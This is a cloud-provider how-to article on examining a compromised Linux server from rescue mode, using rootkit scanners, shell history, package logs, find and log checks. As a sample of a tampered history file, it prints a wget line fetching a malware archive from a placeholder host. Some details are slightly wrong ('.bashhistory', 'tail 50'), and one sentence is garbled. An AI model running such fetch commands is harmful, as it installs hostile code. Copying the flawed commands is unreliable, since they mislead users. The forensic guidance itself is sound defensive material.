---
permalink: check-for-a-security-compromise-rescue-mode-investigation/
audit_date:
title: 'Check for a security compromise: Rescue mode investigation'
type: article
created_date: '2013-04-26'
created_by: Rose Contreras
last_modified_date: '2016-06-10'
last_modified_by: Stephanie Fillmon
product: Cloud Servers
product_url: cloud-servers
---

In the community post, [Checking for a security compromise: Back doors and intruders](https://community.rackspace.com/products/f/public-cloud-forum/7316/checking-for-a-security-compromise-backdoors-and-intruders), 
and in the article,[Check for a security compromise: Rescue mode investigation](https://support.rackspace.com/how-to/check-for-a-security-compromise-rescue-mode-investigation/),
you learned some basic techniques for collecting the information needed to intruders who have compromised your server. This article describes how to use the [Cloud Control Panel's](https://mycloud.rackspace.com/) *Rescue Mode* to take a closer look at your system. You can use rescue mode to better understand how your server was compromised and to identify non-compromised files before backing up the data.

### Activate rescue mode

Because your cloud server's operating system might also be compromised, you cannot rely on it. The intruder could have compromised binaries such as 'ls,' 'find,' and 'netstat,' so their output could mislead you.
Consequently, you must use a different operating system environment to
safely investigate the compromise. You can do this by using the rescue mode feature provided in the [Cloud Control Panel](https://mycloud.rackspace.com/). For instructions and more information, see [Rackspace Cloud Essentials - Rescue Mode on Linux Cloud Servers](/how-to/rackspace-cloud-essentials-rescue-mode-on-linux-cloud-servers).

While your server is in rescue mode, you can perform the following actions to locate the source of the compromise.

### Scan for rootkits

We recommend that you install and use the following tools to scan your system for rootkits.

#### Scan for rootkits with chkrootkit

`chkrootkit` looks for known signatures in compromised binary systems. For example, some compromised versions of `ps` have "`/dev/ptyp`" inside them. We recommend installing `chkrootkit` by using your package manager rather than compiling from source.

1. Run the following command:

        apt-get install chkrootkit

2. Run `chkrootkit` against the mounted file system of the cloud server:

        chkrootkit -r /mnt/demo

The following messages are printed by `chkrootkit` during its tests:

-  `INFECTED` - the test has identified a command probably modified by a known rootkit
-  `not infected` - the test didn't find any known rootkit signature
-  `not tested` - the test was not performed

   This could happen in the following situations:
    - The test is OS specific
    - The test depends on an external program that is not available
    - Some specific command line options are given (for example, `-r`)

-  `not found` - the command to be tested is not found
-  `Vulnerable but disabled` - the command is infected

For more options and information on using `chkrootkit`, see <http://www.chkrootkit.org/README>.

#### Scan for rootkits with rkhunter

Rootkit Hunter (`rkhunter`) checks systems against a database of known rootkits. It can also check other system files to make sure they are in line with expected properties and values.

1. Log in to your terminal application and change to your `sources` directory:

        cd ~/sources

2. Download the latest version of `rkhunter` from the [SourceForge download area](http://sourceforge.net/projects/rkhunter/files/):

        http://sourceforge.net/projects/rkhunter/files/

3. After you install `rkhunter`, run it against `/mnt/demo`.

        rkhunter -c -r /mnt/demo

`rkhunter` produces warnings during the tests that indicate where a file has deviated from expected defaults. Following the test, you can check the log to see more detailed information about which files produced the warning.
For more options and information on using `rkhunter`, see <http://rkhunter.cvs.sourceforge.net/viewvc/rkhunter/rkhunter/files/README>.

### Check last commands

To get an idea of how the cloud server security was breached, check which users ran commands before the cloud server was compromised.

The **.bashhistory** file contains the last commands used with the Bash shell. You need to check the **.bashhistory** files in each user's home directory. The most important **.bashhistory** file is the one belonging to root: **/root/.bashhistory**.

A compromised cloud server might have entries like the following ones:

    wget http://malware.tar.gz
    gunzip malware.tar.gz
    tar xf malware.tar

### Check installed packages

All changes to the packaging system are stored in **/var/log/dpkg.log** on Debian-based distributions. Check this file for any suspicious activity like installed or removed packages, or a modified bus.

Run the following command to show the last 50 lines of the **dpkg.log** file:

    tail 50 /mnt/demo/var/log/dpkg.log

### Use the find command

The `find` command is usually used to find filenames with specific patterns. However, you can also use it to find the files that were modified or accessed within a specific time period.

For example, you can find all files in **/etc** owned by root that have been
modified within the last two days, as follows:

    find /mnt/demo/etc -user root -mtime -2

Available options are as follows:

    -atime: when the file was last accessed
    -ctime: when the file's permissions were last changed
    -mtime: when the file's data was last modified

Note the  minus sign in front of '2' in the preceding example. The 'time' options for the `find` command are expressed in 24-hour increments, and the symbol used in front of the number can indicate *less than* or *greater than*. Thus '-2' means that you want to find files that were modified within the last two days. If you want to find files that were modified more than 2 days ago, use `+2`:

    find /mnt/demo/etc -user root -mtime +2

There are also versions of the `atime`, `ctime`, and `mtime` arguments that
measure time in minutes:

    -amin: when (in minutes) the file was last accessed
    -cmin: when (in minutes) the file's permissions were last changed
    -mmin: when (in minutes) the file's data was last modified

#### Example

Find all of the files in your cloud server owned by the `demo` user
that have been accessed within the last five minutes:

    find /mnt/demo -user demo -amin -5

The following list of `find` command options might be useful while investigating the
compromised cloud server investigation:

    -nouser: shows output not associated with an existing userid
    -nogroup: shows output not associated with an existing groupid
    -links n: file has n links
    -newer file: file was modified more recently than file
    -perm mode: file has mode permissions

### Check logs and suspicious files

You can find an intruder by checking for suspicious files in **/tmp**, **/var/tmp**, **/dev/shm**, **/var/spool/samba**, **/var/spool/squid**, and **/var/spool/cron**.

You can also look at log files in the **/var/log** directory. For example, **auth.log** records user login information, including IP addresses.

### Summary

In [Checking for a security compromise: Backdoors and Intruders](/how-to/checking-for-a-security-compromise-backdoors-and-intruders), you learned some techniques to use to discover back doors and track intruders on your cloud server. This will help you to avoid the situation or
mistake that led to the compromise, minimizing the chance of future compromises. In this article, you learned how to investigate your cloud server in rescue mode.

Whether it is caused by viruses, file corruption, machine failure, or
other unforeseen mishaps, the possibility of data loss is real. To avoid the disruption such a loss can cause, back up your files regularly. Following are some options to help you secure your files:

-   [Rackspace Cloud Backup](http://www.rackspace.com/cloud/backup/) is a good choice for Cloud Servers customers. It is fully integrated with Cloud Servers, and is a file-based backup alternative to whole image server backup.
-   For those who prefer to do it themselves, see [Back up your files with rsync](/how-to/backing-up-your-files-with-rsync).
